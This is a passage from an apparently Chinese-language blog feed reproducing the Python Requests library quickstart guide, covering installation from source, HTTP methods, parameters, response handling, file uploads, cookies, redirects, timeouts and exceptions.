<hr>
<h1 id="获得源码"><a href="#获得源码" class="headerlink" title="获得源码"></a>获得源码</h1><hr>
<p>Requests 一直在Github上被积极的开发着</p>
<p>你可以克隆公共版本库:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> git://github.com/kennethreitz/requests.git</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>下载 源码:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -OL https://github.com/kennethreitz/requests/tarball/master</div></pre></td></tr></table></figure>
<p>或者下载 zipball:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -OL https://github.com/kennethreitz/requests/zipball/master</div></pre></td></tr></table></figure>
<p>一旦你获得了复本，你就可以轻松的将它嵌入到你的python包里或者安装到你的site-packages:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python setup.py install</div></pre></td></tr></table></figure>
<hr>
<h1 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h1><hr>
<hr>
<h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><hr>
<p>使用Requests发送网络请求非常简单。</p>
<p>一开始要导入Requests模块:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div></pre></td></tr></table></figure>
<p>然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div></pre></td></tr></table></figure>
<p>现在，我们有一个名为 r 的 Response 对象。可以从这个对象中获取所有我们想要的信息。</p>
<p>Requests简便的API意味着所有HTTP请求类型都是显而易见的。例如，你可以这样发送一个HTTP POST请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(<span class="string">"http://httpbin.org/post"</span>)</div></pre></td></tr></table></figure>
<p>漂亮，对吧？那么其他HTTP请求类型：PUT， DELETE， HEAD以及OPTIONS又是如何的呢？都是一样的简单:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.put(<span class="string">"http://httpbin.org/put"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.delete(<span class="string">"http://httpbin.org/delete"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(<span class="string">"http://httpbin.org/get"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.options(<span class="string">"http://httpbin.org/get"</span>)</div></pre></td></tr></table></figure>
<p>都很不错吧，但这也仅是Requests的冰山一角呢。</p>
<hr>
<h2 id="为URL传递参数"><a href="#为URL传递参数" class="headerlink" title="为URL传递参数"></a>为URL传递参数</h2><hr>
<p>你也许经常想为URL的查询字符串(query string)传递某种数据。如果你是手工构建URL，那么数据会以键/值 对的形式置于URL中，跟在一个问号的后面。例如， httpbin.org/get?key=val 。 Requests允许你使用 params 关键字参数，以一个字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=payload)</div></pre></td></tr></table></figure>
<p>通过打印输出该URL，你能看到URL已被正确编码:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; print(r.url)</div><div class="line">http://httpbin.org/get?key2=value2&amp;key1=value1</div></pre></td></tr></table></figure>
<p>注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。</p>
<hr>
<h2 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h2><hr>
<p>我们能读取服务器响应的内容。再次以Github时间线为例:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line"><span class="string">u'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></div></pre></td></tr></table></figure>
<p>Requests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。</p>
<p>请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding</div><div class="line"><span class="string">'utf-8'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding = <span class="string">'ISO-8859-1'</span></div></pre></td></tr></table></figure>
<p>如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了。</p>
<p>在你需要的情况下，Requests也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由Requests来为你处理编码。</p>
<hr>
<h2 id="二进制响应内容"><a href="#二进制响应内容" class="headerlink" title="二进制响应内容"></a>二进制响应内容</h2><hr>
<p>你也能以字节的方式访问请求响应体，对于非文本请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.content</div><div class="line"><span class="string">b'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></div></pre></td></tr></table></figure>
<p>Requests会自动为你解码 <strong>gzip</strong> 和 <strong>deflate</strong> 传输编码的响应数据。</p>
<p>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>i = Image.open(StringIO(r.content))</div></pre></td></tr></table></figure>
<hr>
<h2 id="JSON响应内容"><a href="#JSON响应内容" class="headerlink" title="JSON响应内容"></a>JSON响应内容</h2><hr>
<p>Requests中也有一个内置的JSON解码器，助你处理JSON数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</div><div class="line">[&#123;<span class="string">u'repository'</span>: &#123;<span class="string">u'open_issues'</span>: <span class="number">0</span>, <span class="string">u'url'</span>: <span class="string">'https://github.com/...</span></div></pre></td></tr></table></figure>
<p>如果JSON解码失败， r.json 就会抛出一个异常。例如，相应内容是 401 (Unauthorized) ，尝试访问 r.json 将会抛出 ValueError: No JSON object could be decoded 异常。</p>
<hr>
<h2 id="原始响应内容"><a href="#原始响应内容" class="headerlink" title="原始响应内容"></a>原始响应内容</h2><hr>
<p>在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 <strong>stream=True</strong> 。具体的你可以这么做:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>, stream=<span class="keyword">True</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw</div><div class="line">&lt;requests.packages.urllib3.response.HTTPResponse object at <span class="number">0x101194810</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw.read(<span class="number">10</span>)</div><div class="line"><span class="string">'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'</span></div></pre></td></tr></table></figure>
<p>但一般情况下，你应该以下面的模式将文本流保存到文件:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> fd:</div><div class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size):</div><div class="line">        fd.write(chunk)</div></pre></td></tr></table></figure>
<p>使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是<strong>优先推荐</strong>的获取内容方式。</p>
<hr>
<h2 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h2><hr>
<p>如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。</p>
<p>例如，在前一个示例中我们没有指定content-type:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>headers = &#123;<span class="string">'content-type'</span>: <span class="string">'application/json'</span>&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload), headers=headers)</div></pre></td></tr></table></figure>
<hr>
<h2 id="更加复杂的POST请求"><a href="#更加复杂的POST请求" class="headerlink" title="更加复杂的POST请求"></a>更加复杂的POST请求</h2><hr>
<p>通常，你想要发送一些编码为表单形式的数据—非常像一个HTML表单。 要实现这个，只需简单地传递一个字典给 <em>data</em> 参数。你的数据字典 在发出请求时会自动编码为表单形式:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(<span class="string">"http://httpbin.org/post"</span>, data=payload)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"form"</span>: &#123;</div><div class="line">    <span class="string">"key2"</span>: <span class="string">"value2"</span>,</div><div class="line">    <span class="string">"key1"</span>: <span class="string">"value1"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict ，那么数据会被直接发布出去。</p>
<p>例如，Github API v3接受编码为JSON的POST/PATCH数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload))</div></pre></td></tr></table></figure>
<hr>
<h2 id="POST一个多部分编码-Multipart-Encoded-的文件"><a href="#POST一个多部分编码-Multipart-Encoded-的文件" class="headerlink" title="POST一个多部分编码(Multipart-Encoded)的文件"></a>POST一个多部分编码(Multipart-Encoded)的文件</h2><hr>
<p>Requests使得上传多部分编码文件变得很简单:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>)&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"files"</span>: &#123;</div><div class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>你可以显式地设置文件名，文件类型和请求头:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.xls'</span>, open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>), <span class="string">'application/vnd.ms-excel'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"files"</span>: &#123;</div><div class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果你想，你也可以发送作为文件来接收的字符串:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.csv'</span>, <span class="string">'some,data,to,send\nanother,row,to,send\n'</span>)&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"files"</span>: &#123;</div><div class="line">    <span class="string">"file"</span>: <span class="string">"some,data,to,send\\nanother,row,to,send\\n"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望流请求(?)。默认下 requests 不支持, 但有个第三方包支持 - requests-toolbelt. 你可以阅读 toolbelt 文档 来了解使用方法。</p>
<p>在一个请求中发送多文件参考 高级用法 一节.</p>
<hr>
<h2 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h2><hr>
<p>我们可以检测响应状态码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://httpbin.org/get'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div></pre></td></tr></table></figure>
<p>为方便引用，Requests还附带了一个内置的状态码查询对象:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code == requests.codes.ok</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure>
<p>如果发送了一个失败请求(非200响应)，我们可以通过 Response.raise_for_status() 来抛出异常:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r = requests.get(<span class="string">'http://httpbin.org/status/404'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.status_code</div><div class="line"><span class="number">404</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.raise_for_status()</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"requests/models.py"</span>, line <span class="number">832</span>, <span class="keyword">in</span> raise_for_status</div><div class="line">    <span class="keyword">raise</span> http_error</div><div class="line">requests.exceptions.HTTPError: <span class="number">404</span> Client Error</div></pre></td></tr></table></figure>
<p>但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.raise_for_status()</div><div class="line"><span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>一切都挺和谐哈。</p>
<hr>
<h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><hr>
<p>我们可以查看以一个Python字典形式展示的服务器响应头:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</div><div class="line">&#123;</div><div class="line">    <span class="string">'content-encoding'</span>: <span class="string">'gzip'</span>,</div><div class="line">    <span class="string">'transfer-encoding'</span>: <span class="string">'chunked'</span>,</div><div class="line">    <span class="string">'connection'</span>: <span class="string">'close'</span>,</div><div class="line">    <span class="string">'server'</span>: <span class="string">'nginx/1.0.4'</span>,</div><div class="line">    <span class="string">'x-runtime'</span>: <span class="string">'148ms'</span>,</div><div class="line">    <span class="string">'etag'</span>: <span class="string">'"e1ca502697e5c9317743dc078f67693f"'</span>,</div><div class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但是这个字典比较特殊：它是仅为HTTP头部而生的。根据 RFC 2616 ， HTTP头部是大小写不敏感的。</p>
<p>因此，我们可以使用任意大写形式来访问这些响应头字段:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'Content-Type'</span>]</div><div class="line"><span class="string">'application/json'</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers.get(<span class="string">'content-type'</span>)</div><div class="line"><span class="string">'application/json'</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><hr>
<p>如果某个响应中包含一些Cookie，你可以快速访问它们:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</div><div class="line"><span class="string">'example_cookie_value'</span></div></pre></td></tr></table></figure>
<p>要想发送你的cookies到服务器，可以使用 cookies 参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="重定向与请求历史"><a href="#重定向与请求历史" class="headerlink" title="重定向与请求历史"></a>重定向与请求历史</h2><hr>
<p>默认情况下，除了 HEAD, Requests会自动处理所有重定向。</p>
<p>可以使用响应对象的 history 方法来追踪重定向。</p>
<p><strong>Response.history</strong> 是一个:<em>class:Response&lt;requests.Response&gt;</em> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p>
<p>例如，Github将所有的HTTP请求重定向到HTTPS。:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; r = requests.get(&apos;http://github.com&apos;)</div><div class="line">&gt;&gt;&gt; r.url</div><div class="line">&apos;https://github.com/&apos;</div><div class="line">&gt;&gt;&gt; r.status_code</div><div class="line">200</div><div class="line">&gt;&gt;&gt; r.history</div><div class="line">[&lt;Response [301]&gt;]</div></pre></td></tr></table></figure>
<p>如果你使用的是GET, OPTIONS, POST, PUT, PATCH 或者 DELETE,，那么你可以通过 allow_redirects 参数禁用重定向处理:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">False</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">301</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</div><div class="line">[]</div></pre></td></tr></table></figure>
<p>如果你使用的是HEAD，你也可以启用重定向:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">True</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</div><div class="line"><span class="string">'https://github.com/'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</div><div class="line">[&lt;Response [<span class="number">301</span>]&gt;]</div></pre></td></tr></table></figure>
<hr>
<h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><hr>
<p>你可以告诉requests在经过以 timeout 参数设定的秒数时间之后停止等待响应:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</div></pre></td></tr></table></figure>
<blockquote>
<p><strong>注::</strong><br>timeout 仅对连接过程有效，与响应体的下载无关。timeout并不是整个下载响应的时间限制，而是如果服务器在<code>timeout</code>秒内没有应答，将会引发一个异常（更精确地说，是在<code>timeout</code>秒内没有从基础套接字上接收到任何字节的数据时）</p>
</blockquote>
<hr>
<h2 id="错误与异常"><a href="#错误与异常" class="headerlink" title="错误与异常"></a>错误与异常</h2><hr>
<p>遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个 <strong>ConnectionError</strong> 异常。</p>
<p>遇到罕见的无效HTTP响应时，Requests则会抛出一个 <strong>HTTPError</strong> 异常。</p>
<p>若请求超时，则抛出一个 <strong>Timeout</strong> 异常。</p>
<p>若请求超过了设定的最大重定向次数，则会抛出一个 <strong>TooManyRedirects</strong> 异常。</p>
<p>所有Requests显式抛出的异常都继承自 <strong>requests.exceptions.RequestException</strong> 。</p>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;使用 pip 安装Requests非常简单&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;pip install requests&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;或者使用 easy_install 安装&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;easy_install requests&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;获得源码&quot;&gt;&lt;a href=&quot;#获得源码&quot; class=&quot;headerlink&quot; title=&quot;获得源码&quot;&gt;&lt;/a&gt;获得源码&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;Requests 一直在Github上被积极的开发着&lt;/p&gt;
&lt;p&gt;你可以克隆公共版本库:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; git://github.com/kennethreitz/requests.git&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
